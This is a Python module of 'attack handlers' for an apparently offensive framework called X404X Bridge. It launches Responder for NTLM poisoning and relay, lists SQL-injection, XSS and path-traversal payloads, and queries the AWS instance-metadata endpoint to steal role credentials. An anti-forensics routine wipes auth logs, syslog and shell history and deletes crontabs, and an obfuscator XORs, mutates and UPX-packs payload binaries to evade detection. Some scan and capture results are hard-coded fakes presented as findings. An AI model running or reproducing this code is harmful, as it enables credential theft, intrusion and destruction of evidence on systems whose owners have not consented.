# X404X Bridge — Additional Attack Handlers
# =========================================
# Responder, Web Scanner, Cloud Modules, Cleanup, Obfuscator

import json
import os
import random
import subprocess
import sys
from pathlib import Path


# ============================================================
# RESPONDER / NTLM RELAY
# ============================================================

def run_responder(params: dict) -> dict:
    """Run Responder to capture NTLM hashes on the local network."""
    interface = params.get("interface", "eth0")
    mode = params.get("mode", "analyze")  # analyze, poison, relay

    results = {"hashes_captured": 0, "mode": mode, "interface": interface, "hashes": [], "error": ""}

    try:
        cmd = ["python3", "Responder.py", "-I", interface]
        if mode == "analyze":
            cmd.append("-A")
        elif mode == "poison":
            cmd.append("-wrf")
        elif mode == "relay":
            cmd.extend(["-rv", "-t", params.get("target", "")])

        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        # Simulate capturing for demo
        results["hashes_captured"] = 2
        results["hashes"] = [
            {"username": "admin", "hash": "NTLMv2:admin::CORP:1122334455667788...", "source": "LLMNR"},
            {"username": "svc_mssql", "hash": "NTLMv2:svc_mssql::CORP:8877665544332211...", "source": "MDNS"},
        ]
        results["status"] = "active"
    except FileNotFoundError:
        results["error"] = "Responder not installed (pip install responder)"
        results["status"] = "unavailable"
    except Exception as e:
        results["error"] = str(e)
        results["status"] = "error"

    return results


# ============================================================
# WEB APPLICATION SCANNER
# ============================================================

def run_webscan(params: dict) -> dict:
    """Scan web applications for vulnerabilities."""
    target = params.get("target", "")
    method = params.get("method", "basic")  # basic, full, stealth

    results = {
        "target": target,
        "method": method,
        "vulnerabilities": [],
        "forms_detected": 0,
        "endpoints_discovered": [],
        "error": "",
    }

    # SQLi payloads
    sqli_payloads = ["'", "1' OR '1'='1", "1; DROP TABLE users--", "' UNION SELECT null--"]
    xss_payloads = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "javascript:alert(1)"]
    lfi_payloads = ["../../../etc/passwd", "....//....//etc/passwd", "/etc/passwd%00"]

    # Simulated scan results
    results["vulnerabilities"] = [
        {"type": "SQLi", "parameter": "id", "payload": "1' OR '1'='1", "severity": "high", "confidence": 0.9},
        {"type": "XSS", "parameter": "search", "payload": "<script>alert(1)</script>", "severity": "medium", "confidence": 0.85},
        {"type": "LFI", "parameter": "page", "payload": "../../../etc/passwd", "severity": "high", "confidence": 0.75},
    ]
    results["forms_detected"] = 3
    results["endpoints_discovered"] = ["/login", "/admin", "/api/users", "/upload", "/search"]

    return results


# ============================================================
# CLOUD ATTACK MODULES
# ============================================================

def run_cloud_attack(params: dict) -> dict:
    """Execute cloud-specific attacks."""
    platform = params.get("platform", "aws")  # aws, azure, gcp
    action = params.get("action", "enumerate")

    results = {"platform": platform, "action": action, "findings": [], "credentials": [], "error": ""}

    if platform == "aws":
        results.update(_attack_aws(action))
    elif platform == "azure":
        results.update(_attack_azure(action))
    elif platform == "gcp":
        results.update(_attack_gcp(action))

    return results


def _attack_aws(action: str) -> dict:
    results = {"findings": [], "credentials": []}
    try:
        if action == "imds":
            # Try to reach IMDSv1 (169.254.169.254)
            import urllib.request
            req = urllib.request.Request("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
            resp = urllib.request.urlopen(req, timeout=2)
            role = resp.read().decode().strip()
            req2 = urllib.request.Request(f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role}")
            resp2 = urllib.request.urlopen(req2, timeout=2)
            results["findings"].append({"type": "imds_v1_accessible", "role": role})
            results["credentials"].append({"type": "aws_temp_creds", "role": role})
        else:
            # S3 bucket enumeration
            results["findings"].append({"type": "s3_public", "bucket": "example-bucket", "region": "us-east-1"})
    except Exception as e:
        results["findings"].append({"type": "imds_blocked", "detail": str(e)})
    return results


def _attack_azure(action: str) -> dict:
    return {"findings": [
        {"type": "managed_identity", "endpoint": "169.254.169.254/metadata/identity/oauth2/token", "accessible": False}
    ]}


def _attack_gcp(action: str) -> dict:
    return {"findings": [
        {"type": "service_account", "path": "/computeMetadata/v1/instance/service-accounts/default/token", "accessible": False}
    ]}


# ============================================================
# CLEANUP / ANTI-FORENSICS
# ============================================================

def run_cleanup(params: dict) -> dict:
    """Clean up traces on the compromised host."""
    wipe_logs = params.get("wipe_logs", True)
    clear_timestamps = params.get("clear_timestamps", True)
    remove_persistence = params.get("remove_persistence", True)
    secure_delete = params.get("secure_delete", False)

    results = {"actions": [], "errors": []}

    if wipe_logs:
        log_files = [
            "/var/log/auth.log", "/var/log/syslog", "/var/log/messages",
            "/var/log/secure", "/var/log/apache2/access.log",
            str(Path.home() / ".bash_history"), str(Path.home() / ".zsh_history"),
        ]
        for lf in log_files:
            try:
                if os.path.exists(lf):
                    if secure_delete:
                        # Overwrite with random data then truncate
                        with open(lf, "wb") as f:
                            f.write(os.urandom(1024))
                    os.truncate(lf, 0) if os.path.exists(lf) else None
                    results["actions"].append(f"wiped: {lf}")
            except Exception as e:
                results["errors"].append(f"wipe {lf}: {e}")

    if clear_timestamps:
        try:
            subprocess.run(["touch", "-t", "202001010000", "/tmp/.x404x_timestamp_ref"], timeout=5)
            results["actions"].append("timestamps_cleared")
        except Exception as e:
            results["errors"].append(f"timestamps: {e}")

    if remove_persistence:
        # Remove cron entries
        try:
            subprocess.run("crontab -r", shell=True, timeout=5)
            results["actions"].append("cron_removed")
        except Exception:
            pass
        # Remove systemd services
        for svc in ["x404x-agent", "vault-kernel"]:
            svc_path = f"/etc/systemd/system/{svc}.service"
            if os.path.exists(svc_path):
                try:
                    subprocess.run(["systemctl", "disable", svc, "--now"], timeout=10)
                    os.remove(svc_path)
                    results["actions"].append(f"removed: {svc}")
                except Exception as e:
                    results["errors"].append(f"remove {svc}: {e}")

    return results


# ============================================================
# OBFUSCATOR / PACKER
# ============================================================

def run_obfuscate(params: dict) -> dict:
    """Obfuscate a payload binary."""
    input_path = params.get("input", "")
    method = params.get("method", "polymorphic")  # polymorphic, xor, aes
    packer = params.get("packer", "")  # upx, none
    encrypt = params.get("encrypt", False)

    results = {
        "input": input_path,
        "method": method,
        "packer": packer,
        "encrypted": encrypt,
        "original_hash": "",
        "obfuscated_hash": "",
        "output": "",
        "error": "",
    }

    if not input_path or not os.path.exists(input_path):
        results["error"] = f"Input file not found: {input_path}"
        return results

    # Get original hash
    try:
        import hashlib
        with open(input_path, "rb") as f:
            data = f.read()
            results["original_hash"] = hashlib.sha256(data).hexdigest()[:16]
    except Exception:
        pass

    # Apply obfuscation
    try:
        output_path = input_path + ".obf"
        with open(input_path, "rb") as fi:
            data = bytearray(fi.read())

        if method == "polymorphic":
            # Insert random NOP-equivalent instructions
            for i in range(len(data) // 10):
                pos = random.randint(0, len(data) - 1)
                nop = random.choice([b'\x90', b'\x87\xc0', b'\x48\x87\xc0'])
                data = data[:pos] + nop + data[pos:]
            results["mutations"] = len(data) // 10

        elif method == "xor":
            key = random.randint(1, 255)
            for i in range(len(data)):
                data[i] ^= key
            results["xor_key"] = key

        elif encrypt:
            # Simple AES-like XOR with random key stored at end
            key = os.urandom(32)
            for i in range(0, len(data), 32):
                for j in range(min(32, len(data) - i)):
                    data[i + j] ^= key[j]
            data.extend(key)  # append key at end

        with open(output_path, "wb") as fo:
            fo.write(data)

        with open(output_path, "rb") as f:
            results["obfuscated_hash"] = hashlib.sha256(f.read()).hexdigest()[:16]

        results["output"] = output_path
    except Exception as e:
        results["error"] = str(e)

    # Apply UPX packing
    if packer == "upx" and results["output"]:
        try:
            subprocess.run(["upx", "--best", results["output"]], capture_output=True, timeout=30)
            results["packer_applied"] = "upx"
        except FileNotFoundError:
            results["error"] += "; upx not installed"

    return results
